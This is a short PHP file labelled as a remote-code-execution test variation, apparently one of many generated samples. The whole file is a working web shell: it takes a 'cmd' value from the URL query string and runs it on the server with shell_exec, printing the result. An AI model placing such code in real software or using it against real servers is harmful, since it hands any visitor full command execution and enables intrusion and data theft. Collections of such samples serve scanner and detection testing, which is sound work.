<?php
// RCE test variation #1156
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>